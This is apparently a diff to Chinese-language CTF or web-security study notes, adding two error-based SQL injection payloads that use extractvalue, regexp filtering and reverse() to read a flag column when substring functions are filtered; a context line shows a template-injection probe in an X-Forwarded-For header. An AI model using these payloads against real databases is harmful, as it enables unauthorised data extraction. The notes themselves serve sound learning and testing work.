@@ -817,6 +817,12 @@ X-Forwarded-For: {{7*7}}
 
 筛选为f结尾的
 
+payloa实例:
+
+```
+0"||extractvalue(1,concat('~',(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('^f'))))||"
+```
+
 
 
 ## reverse()函数
@@ -824,6 +830,12 @@ X-Forwarded-For: {{7*7}}
 当过滤了mid、substr、left、right关键字，无法分段读取时
 
 可以使用reverse函数倒序输出字符串
+
+payload实例:
+
+```
+0"||extractvalue(1,concat('~',reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('^f')))))||"
+```
 
 
 
